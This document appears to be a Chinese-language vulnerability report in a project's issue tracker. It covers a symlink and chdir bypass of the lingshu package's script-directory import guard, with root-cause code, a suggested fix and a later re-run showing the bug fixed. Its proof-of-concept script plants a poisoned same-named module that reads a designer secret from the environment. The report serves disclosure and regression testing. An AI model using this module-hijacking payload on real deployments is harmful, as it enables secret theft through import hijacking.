**项目归属（补）**：`project:memory`（lingshu 的提交在评估表里按 #6、#8 的先例归 memory；如维护者另有 lingshu 归属请改） · **难度自申请（补）**：medium（要比对解释器 sys.path[0] 与 _pathguard 的两套口径，三种启动形态；最终定档以维护者为准）
**影响等级建议（补）**：B（毒组件可读到设计者密钥（安全），但需要通过符号链接或 import 前 chdir 启动（特定路径）。按《价值评价规格 v0.1》§四「不做会怎样」判）
**意图（补）**：让维护者知道：#156 v2 的脚本目录排除可经符号链接/chdir 绕过。

**基线**：`83cce59`（main HEAD；原审计 `e18562f`）· Python 3.14.3 / Windows 11（原审计 Python 3.12.15 / Linux）· 隔离临时目录；仓库只读复核，未改动任何文件

## 现象
lingshu/_pathguard.py 的 main_script_dir() 用 isfile(argv[0]) + dirname(abspath(argv[0])) 推脚本目录（不解析符号链接，且依赖判定时的 cwd）；component_resolver._norm() 也只用 normcase(abspath(...))。解释器放进 sys.path[0] 的是真实路径，于是「排除脚本目录」这条护栏在这些形态下不生效。

## 实测读数
```
对照（无符号链接）：sys.path[0] 与 main_script_dir() 同为 /tmp/.../app，毒组件 No module named 'self_cognition_engine'。
[A] 经**目录符号链接**启动：sys.path[0]=/tmp/.../app，main_script_dir()=/tmp/.../app_link → 不一致，[POISON] self_cognition_engine executed，毒组件读到 designer-secret。
[B] 经**文件符号链接**启动：sys.path[0]=.../app，main_script_dir()=.../bin → 同样被执行。
[C] cd app && python main.py，脚本在 import lingshu 前 chdir：main_script_dir() 返回 **None**，脚本目录仍留在 safe_search_path() 里（我在 Windows 上独立复核了这一条：sys.path[0]=<temp>\c3app_...、main_script_dir()=None、脚本目录仍在解析面 True）。
```

## 最小复现
依赖：纯标准库。符号链接两段（[A]/[B]）需 POSIX 或已开启开发者模式的 Windows；[C]（chdir）在任何平台都可复现。

### issue1_scriptdir_symlink_bypass.py
```python
# -*- coding: utf-8 -*-
"""issue1：component_resolver 的「排除脚本目录」用 abspath(argv[0]) 推算脚本目录，
与解释器实际放进 sys.path[0] 的目录（realpath，符号链接已解析）不一致 ⇒
经符号链接启动（或脚本在 import lingshu 前 chdir）时，脚本目录里的同名毒组件
在引擎构造期被执行（#156 v2 声称已封住的面）。

用法：cd <仓根> && python <本脚本>   （只用临时目录）
"""
import os
import subprocess
import sys
import tempfile

REPO = os.path.dirname(os.path.dirname(os.path.abspath(
    __import__("lingshu").__file__)))

POISON = '''print("[POISON] self_cognition_engine executed from", __file__)
class SelfCognitionEngine:
    def __init__(self, engine):
        import os
        engine._poison_saw_key = os.environ.get("AEIS_DESIGNER_KEY")
    def log_action(self, *a, **k):
        pass
'''

MAIN = '''import os, sys
if os.environ.get("CHDIR_BEFORE_IMPORT"):
    os.chdir(os.environ["CHDIR_BEFORE_IMPORT"])
p0 = sys.path[0]
from lingshu.core.core import SpacetimeMemoryEngine
import lingshu._pathguard as pg
e = SpacetimeMemoryEngine(":memory:")
print("sys.path[0](解释器)       =", p0)
print("main_script_dir()(lingshu) =", pg.main_script_dir())
print("_self_cognition_error      =", repr(e._self_cognition_error))
print("poison 读到的密钥          =", getattr(e, "_poison_saw_key", None))
'''


def run(label, script, cwd, extra_env=None):
    env = {k: v for k, v in os.environ.items()
           if k not in ("LINGSHU_ALLOW_CWD_IMPORTS", "LINGSHU_COMPONENT_ROOT")}
    env["PYTHONPATH"] = REPO
    env["AEIS_DESIGNER_KEY"] = "designer-secret"
    env.update(extra_env or {})
    r = subprocess.run([sys.executable, "-W", "ignore", script], cwd=cwd,
                       env=env, capture_output=True, text=True)
    print("==", label)
    out = (r.stdout + r.stderr).strip().splitlines()
    for line in out:
        if "Warning" in line or line.startswith("  from "):
            continue
        print("  ", line)
    return "[POISON]" in r.stdout


def main():
    base = tempfile.mkdtemp(prefix="r2c_i1_")
    real = os.path.join(base, "app")
    os.makedirs(real)
    with open(os.path.join(real, "main.py"), "w") as f:
        f.write(MAIN)
    with open(os.path.join(real, "self_cognition_engine.py"), "w") as f:
        f.write(POISON)
    os.symlink(real, os.path.join(base, "app_link"))           # 目录符号链接
    os.makedirs(os.path.join(base, "bin"))
    os.symlink(os.path.join(real, "main.py"),
               os.path.join(base, "bin", "run.py"))             # 文件符号链接（~/bin 常见形态）
    elsewhere = tempfile.mkdtemp(prefix="r2c_i1_cwd_")

    ctrl = run("[对照] python <真实路径>/app/main.py（cwd 为别处）",
               os.path.join(real, "main.py"), elsewhere)
    a = run("[A] python <目录符号链接>/main.py",
            os.path.join(base, "app_link", "main.py"), elsewhere)
    b = run("[B] python bin/run.py（文件符号链接 → app/main.py）",
            os.path.join(base, "bin", "run.py"), elsewhere)
    c = run("[C] cd app && python main.py，脚本在 import lingshu 前 chdir 到别处",
            "main.py", real, {"CHDIR_BEFORE_IMPORT": elsewhere})
    print()
    print("对照毒组件执行:", ctrl, "| A:", a, "| B:", b, "| C:", c)
    print("VERDICT=" + ("BUG" if (not ctrl and (a or b or c)) else "OK"))


if __name__ == "__main__":
    main()
```

## 代码定位
```
lingshu/_pathguard.py:182-202
def main_script_dir():
    """`python <script>.py` 形态下 `sys.path[0]` 所指向的**脚本目录**（或 None）。

    `-c`（argv0 == '-c'）/ `-m`（argv0 为模块文件，其目录通常不在 sys.path）/
    REPL 形态返回 None。脚本目录同属「解释器隐式塞入的解析面」，不属部署方
    显式声明面 ⇒ `component_resolver.safe_search_path()` 亦将其排除。
    """
    argv = _sys.argv
    if not argv:
        return None
    argv0 = argv[0]
    if not isinstance(argv0, str) or not argv0 or argv0.startswith("-"):
        return None
    if _os is None:
        return None
    try:
        if not _os.path.isfile(argv0):
            return None
        return _os.path.dirname(_os.path.abspath(argv0))
    except Exception:
        return None

lingshu/core/component_resolver.py:118-130
def _is_script_dir_entry(entry) -> bool:
    """`sys.path` 条目是否为 `python <script>.py` 形态的**脚本目录**。

    脚本目录同属「解释器隐式塞入」的解析面（非部署方显式声明），故亦不视为
    受控面（v2 补强：上一版只判 cwd/空串 ⇒ 脚本目录 != cwd 时毒白名单组件
    仍被执行）。
    """
    if not isinstance(entry, str) or entry == "":
        return False
    sd = _main_script_dir()
    if not sd:
        return False
    return _norm(entry) == _norm(sd)
```

## 修法
两侧都用 realpath 归一；argv[0] 在启动时快照一次（sys.argv 尚未受 chdir 影响前），不要判定时现算。
回归测试覆盖三种启动形态（目录链接、文件链接、import 前 chdir）下的毒组件注入。

## 与已有 issue 的关系
#273 / #275 讲的是同一护栏的另一面（v2 直接改写宿主 sys.path、finder 接管 15 个通用模块名），#338 是 cwd_excluded_count 的计数语义——本条是第三面：该排除的目录没被排除。

## 在当前 HEAD 上复跑（补，2026-10-12）

被测提交：`cb3a6ea`（lingshu main 最新，2026-10-11 22:25 +0800）· Debian 13 / Linux 6.12 · Python 3.12.15 · numpy 2.5.3 · Pillow 12.3.0 · PyYAML 6.0.3 · 在仓根运行、`PYTHONPATH` 指向该克隆，脚本只写临时目录。

`python -X utf8 issue1_scriptdir_symlink_bypass.py`：

```
== [对照] python <真实路径>/app/main.py（cwd 为别处）
   sys.path[0](解释器)       = /tmp/r2c_i1_yy1elek4/app
   main_script_dir()(lingshu) = /tmp/r2c_i1_yy1elek4/app
   _self_cognition_error      = "No module named 'self_cognition_engine'"
   poison 读到的密钥          = None
== [A] python <目录符号链接>/main.py
   sys.path[0](解释器)       = /tmp/r2c_i1_yy1elek4/app
   main_script_dir()(lingshu) = /tmp/r2c_i1_yy1elek4/app
   _self_cognition_error      = "No module named 'self_cognition_engine'"
   poison 读到的密钥          = None
== [B] python bin/run.py（文件符号链接 → app/main.py）
   sys.path[0](解释器)       = /tmp/r2c_i1_yy1elek4/app
   main_script_dir()(lingshu) = /tmp/r2c_i1_yy1elek4/app
   _self_cognition_error      = "No module named 'self_cognition_engine'"
   poison 读到的密钥          = None
== [C] cd app && python main.py，脚本在 import lingshu 前 chdir 到别处
   sys.path[0](解释器)       = /tmp/r2c_i1_yy1elek4/app
   main_script_dir()(lingshu) = /tmp/r2c_i1_yy1elek4/app
   _self_cognition_error      = "No module named 'self_cognition_engine'"
   poison 读到的密钥          = None
对照毒组件执行: False | A: False | B: False | C: False
VERDICT=OK
```
**主现象在 `cb3a6ea` 上已不复现**，应是上游已修（本 issue 仍为 open）。本条保留作记录，建议请维护者确认修复提交后关闭。本次读数：VERDICT=OK（上游 a708736「#343 脚本目录护栏两侧同归一」）

## 预期结果（补）

修复后，维护者用同一脚本复跑应看到：

- 三种启动形态（目录链接、文件链接、import 前 chdir）下毒组件都不被执行，读到的密钥为 None
- 末行 `VERDICT=OK`

## 守卫与定点变异（补，验收判据，尚未实测）

本条只报缺陷、没有附补丁，所以**还没有**修前红 / 修后绿的读数。建议按这两步验收：
1. 把上面的复现脚本改写成守卫：在当前 HEAD 上必须红（上一节已经是红——注：本条在 cb3a6ea 上已经转绿，守卫应直接绿），修复后必须绿；
2. 定点变异：在修复上把关键的那一处改回原样（正文「修法」里提到的那行），守卫必须转红并点名对应断言，还原后转绿。

## 可信边界（补）

**已验**：原审计 `e18562f`（Linux，Python 3.12.15）；提交时 main HEAD `83cce59`（Windows 11，Python 3.14.3）；本次 `cb3a6ea`（Linux，Python 3.12.15）读数见上一节。
**未验**：没有写补丁，修法未经测试；没有跑上游 pytest 全量；没有在 macOS 上跑。
**不确定**：`cb3a6ea` 上脚本已转绿，但没有逐一找到对应的修复提交（上游批量修复提交 c22385c / df6e629 / abb52d0 / 777e18f 的说明里不一定写 issue 号）；影响等级和难度以维护者定档为准。
